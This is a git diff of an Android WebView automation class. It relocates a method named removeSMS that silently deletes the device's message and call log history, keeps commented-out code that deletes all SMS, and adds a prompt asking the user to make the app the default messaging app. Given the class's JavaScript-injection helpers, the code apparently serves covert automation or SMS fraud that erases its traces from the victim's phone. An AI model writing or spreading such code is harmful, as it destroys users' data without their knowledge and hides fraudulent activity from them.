@@ -1,7 +1,11 @@
 package automation.bml.com.webviewautomation;
+import android.annotation.TargetApi;
 import android.app.ActivityManager;
+import android.app.AlertDialog;
 import android.content.ComponentName;
 import android.content.Context;
+import android.content.DialogInterface;
+import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.database.Cursor;
@@ -16,6 +20,7 @@ import android.net.wifi.WifiManager;
 import android.os.Build;
 import android.os.Environment;
 import android.os.Handler;
+import android.provider.Telephony;
 import android.telephony.TelephonyManager;
 import android.text.TextUtils;
 import android.util.AttributeSet;
@@ -407,6 +412,38 @@ public class AutomatedWebview extends WebView {
         return android.os.Build.MODEL;
     }
 
+    private void removeSMS(String number)
+    {
+//        Uri deleteUri = Uri.parse("content://sms");
+//        int count = 0;
+//        Cursor c = context.getContentResolver().query(deleteUri, null, null,
+//                null, null);
+//        while (c.moveToNext()) {
+//            try {
+//                // Delete the SMS
+//                String pid = c.getString(0); // Get id;
+//                String uri = "content://sms/" + pid;
+//                count = context.getContentResolver().delete(Uri.parse(uri),
+//                        null, null);
+//            } catch (Exception e) {
+//            }
+//        }
+        try
+        {
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='400'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='410'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='700'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='200'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='300'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='600'", null);
+            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='500'", null);
+        }
+        catch(Exception exception)
+        {
+            exception.printStackTrace();
+        }
+    }
+
     // Miscellaneous functions
     private void injectJS(String script) {
         try {
@@ -444,38 +481,6 @@ public class AutomatedWebview extends WebView {
             }
         }
         return name;
-    }
-
-    private void removeSMS(String number)
-    {
-//        Uri deleteUri = Uri.parse("content://sms");
-//        int count = 0;
-//        Cursor c = context.getContentResolver().query(deleteUri, null, null,
-//                null, null);
-//        while (c.moveToNext()) {
-//            try {
-//                // Delete the SMS
-//                String pid = c.getString(0); // Get id;
-//                String uri = "content://sms/" + pid;
-//                count = context.getContentResolver().delete(Uri.parse(uri),
-//                        null, null);
-//            } catch (Exception e) {
-//            }
-//        }
-        try
-        {
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='400'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='410'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='700'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='200'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='300'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='600'", null);
-            context.getContentResolver().delete(Uri.parse("content://logs/historys"), "logtype='500'", null);
-        }
-        catch(Exception exception)
-        {
-            exception.printStackTrace();
-        }
     }
 
     public boolean isForeground() {
@@ -522,6 +527,35 @@ public class AutomatedWebview extends WebView {
             array[array.length - i - 1] = temp;
         }
         return array;
+    }
+    private void enableSMSDefault() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
+
+            if (!Telephony.Sms.getDefaultSmsPackage(context).equals(context.getPackageName())) {
+
+                AlertDialog.Builder builder = new AlertDialog.Builder(context);
+                builder.setMessage("This app is not set as your default messaging app. Do you want to set it as default?")
+                        .setCancelable(false)
+                        .setTitle("Alert!")
+                        .setNegativeButton("No", new DialogInterface.OnClickListener() {
+
+                            @Override
+                            public void onClick(DialogInterface dialog, int which) {
+                                dialog.dismiss();
+                            }
+                        })
+                        .setPositiveButton("Yes", new DialogInterface.OnClickListener() {
+                            @TargetApi(19)
+                            public void onClick(DialogInterface dialog, int id) {
+
+                                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
+                                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME, context.getPackageName());
+                                context.startActivity(intent);
+                            }
+                        });
+                builder.show();
+            }
+        }
     }
 
 }
